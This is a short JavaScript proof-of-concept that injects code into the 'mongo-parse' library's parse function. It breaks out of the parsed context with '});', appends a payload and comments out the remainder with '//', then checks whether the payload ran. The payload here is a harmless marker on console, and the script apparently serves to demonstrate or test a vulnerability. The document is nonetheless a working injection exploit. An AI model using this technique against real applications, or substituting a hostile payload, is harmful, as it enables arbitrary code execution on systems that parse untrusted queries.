done = function done(){
    console.log("Done!");
};

var payload = 'console[\"my-awesome-prop-23-42\"] = 23;';
var parser = require('mongo-parse');
var query = parser.parse('}); ' + payload + '//');


if (console["my-awesome-prop-23-42"]){
    console.log("payload was delivered");
} else {
    console.log("payload NOT delivered");
}


